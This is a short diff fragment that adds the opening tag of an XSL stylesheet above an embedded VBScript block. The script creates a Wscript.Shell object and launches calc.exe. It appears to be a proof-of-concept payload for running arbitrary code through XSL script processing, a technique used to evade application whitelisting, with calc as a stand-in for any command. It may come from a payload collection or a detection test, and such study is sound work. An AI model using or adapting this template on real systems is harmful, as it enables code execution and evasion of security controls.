@@ -1,3 +1,4 @@
+<xsl:stylesheet  xmlns:xsl="http://www.w3.org/TR/WD-xsl">
 <xsl:script language="VBScript"><![CDATA[
 Set shl = CreateObject("Wscript.Shell")  
 Call shl.Run("""calc.exe""")  
